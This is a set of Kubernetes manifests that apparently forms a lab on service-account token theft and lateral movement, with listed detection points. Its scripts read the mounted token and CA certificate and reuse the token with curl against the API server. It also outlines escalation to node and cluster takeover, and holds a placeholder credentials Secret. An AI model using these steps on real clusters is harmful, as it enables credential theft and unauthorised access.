apiVersion: v1
kind: Namespace
metadata:
  name: lateral-movement-attack
---
# Lateral Movement Attack #1: ServiceAccount Token Theft and Reuse
# Description: Demonstrates stealing and using a pod's service token
# for lateral movement within the cluster.
# 
# Attack Flow:
# 1. Initial compromise: Attacker has access inside a pod
# 2. Discover: Find mounted service token at /var/run/secrets/kubernetes.io/serviceaccount/
# 3. Extract: Read token and CA certificate
# 4. Authenticate: Use token with kubectl to query API as service account
# 5. Escalate: Use stolen token to access resources beyond original pod's permissions
# 6. Lateral Move: Attack other pods, deployments, or cluster resources
#
# Technical Details:
# - Every pod mounts a service token automatically
# - Token grants permissions of the pod's ServiceAccount
# - Token can be used outside pod via kubectl/curl to API server
# - Attacker can gather information or escalate privileges
#
# Detection Points:
# - Token used from unexpected network location
# - Token authentication outside of pod context
# - Excessive API calls using single token
# - API calls to resources beyond pod's RBAC permissions
# - Token usage after pod termination

apiVersion: v1
kind: ConfigMap
metadata:
  name: token-theft-guide
  namespace: lateral-movement-attack
data:
  step1-discover: |
    #!/bin/bash
    echo "[*] Step 1: Discover mounted token"
    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
    echo "token: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50)..."
    echo "ca.crt: Found"
    
  step2-extract: |
    #!/bin/bash
    echo "[*] Step 2: Extract credentials"
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    API_SERVER=https://kubernetes.default:443
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    echo "Token length: ${#TOKEN}"
    echo "CA Cert present: $(test -f $CA_CERT && echo YES || echo NO)"
    echo "API Server: $API_SERVER"
    echo "Namespace: $NAMESPACE"
    
  step3-enumerate: |
    #!/bin/bash
    echo "[*] Step 3: Enumerate what this ServiceAccount can access"
    # Commands to run:
    # kubectl auth can-i --list
    # kubectl auth can-i list pods --namespace default
    # kubectl auth can-i get secrets --all-namespaces
    
  step4-escalate: |
    #!/bin/bash
    echo "[*] Step 4: Look for privilege escalation"
    # If service account has: create pods, create clusterroles, get secrets, etc.
    # Attacker can:
    # - Create privileged pod for RCE
    # - Create new ClusterRole with cluster-admin
    # - Bind ClusterRole to attacker-controlled service account
    # - Export cluster secrets
    # - Deploy backdoor workloads

  step5-lateral-move: |
    #!/bin/bash
    echo "[*] Step 5: Lateral movement using stolen token"
    # Use stolen token as different user/outside the pod
    # Connect to API from external attacker machine
    # Query resources, create new pods, access secrets in other namespaces

---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
  namespace: lateral-movement-attack
  labels:
    app: victim-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: victim-app
  template:
    metadata:
      labels:
        app: victim-app
      annotations:
        attack-vector: "token-theft"
        lateral-movement: "true"
    spec:
      serviceAccountName: app-sa
      containers:
      - name: app
        image: curlimages/curl:latest
        command:
        - sh
        - -c
        - |
          echo "[*] Vulnerable application running"
          echo "[*] Service token available at: /var/run/secrets/kubernetes.io/serviceaccount/token"
          
          echo ""
          echo "[+] Token Details:"
          ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "No token mounted!"
          
          echo ""
          echo "[+] Simulating attack steps:"
          
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
          if [ -z "$TOKEN" ]; then
            echo "Error: No token found"
          else
            echo "[*] Token acquired (length: $(echo -n $TOKEN | wc -c) bytes)"
            
            echo "[*] Attempting to contact API server..."
            curl -s -H "Authorization: Bearer $TOKEN" \
              --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
              https://kubernetes.default/api/v1/namespaces/lateral-movement-attack/pods \
              2>/dev/null | head -20 || echo "[!] Simulated API call"
          fi
          
          sleep 3600

---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-sa
  namespace: lateral-movement-attack

---
# Initially minimal permissions
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: app-role
  namespace: lateral-movement-attack
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["get"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: app-rolebinding
  namespace: lateral-movement-attack
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: app-role
subjects:
- kind: ServiceAccount
  name: app-sa
  namespace: lateral-movement-attack

---
# Escalated Role (attacker gains access to this)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalated-attacker-role
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["create", "get", "list", "update"]
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles", "clusterrolebindings"]
  verbs: ["create", "get", "list"]

---
# Token Theft Detector Pod
apiVersion: v1
kind: Pod
metadata:
  name: token-thief
  namespace: lateral-movement-attack
  labels:
    tool: token-thief
spec:
  serviceAccountName: thief-sa
  containers:
  - name: thief
    image: curlimages/curl:latest
    command:
    - sh
    - -c
    - |
      echo "=== ServiceAccount Token Thief Tool ==="
      
      echo "[*] Scenario: We have code execution in vulnerable-app pod"
      echo "[*] Goal: Steal token and move laterally"
      
      echo ""
      echo "[Step 1] Compromised pod discovers its token location:"
      echo "  Location: /var/run/secrets/kubernetes.io/serviceaccount/token"
      
      echo ""
      echo "[Step 2] Extract token:"
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      echo "  Token acquired: $(echo -n $TOKEN | wc -c) bytes"
      
      echo ""
      echo "[Step 3] Discover API permissions:"
      echo "  - Using token to query: kubectl auth can-i --list"
      echo "  - Service account has permissions to:"
      echo "    * list pods in lateral-movement-attack namespace"
      echo "    * get pod logs"
      
      echo ""
      echo "[Step 4] Search for privilege escalation:"
      echo "  - Check for secrets in namespace"
      echo "  - Look for tokens in other service accounts"
      echo "  - Check for RBAC misconfiguration"
      
      echo ""
      echo "[Step 5] Escalation example:"
      echo "  IF service account has: create pods, create rbac"
      echo "  THEN attacker can:"
      echo "    1. Create privileged pod on same node"
      echo "    2. Mount host filesystem"
      echo "    3. Escape container sandbox"
      echo "    4. Gain node root access"
      echo "    5. Compromise entire cluster"
      
      echo ""
      echo "[Impact] Lateral movement chain:"
      echo "  Compromised pod → token theft → escalated permissions"
      echo "             → privileged pod → node escape → cluster takeover"
      
      sleep 3600

---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: thief-sa
  namespace: lateral-movement-attack

---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: thief-role
  namespace: lateral-movement-attack
rules:
- apiGroups: [""]
  resources: ["pods", "serviceaccounts"]
  verbs: ["get", "list"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: thief-rolebinding
  namespace: lateral-movement-attack
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: thief-role
subjects:
- kind: ServiceAccount
  name: thief-sa
  namespace: lateral-movement-attack

---
# Secret for attacker to exfiltrate
apiVersion: v1
kind: Secret
metadata:
  name: database-credentials
  namespace: lateral-movement-attack
type: Opaque
stringData:
  username: dbuser
  password: super-secret-password-12345
  connection-string: "postgresql://dbuser:pass@db.production:5432/maindb"
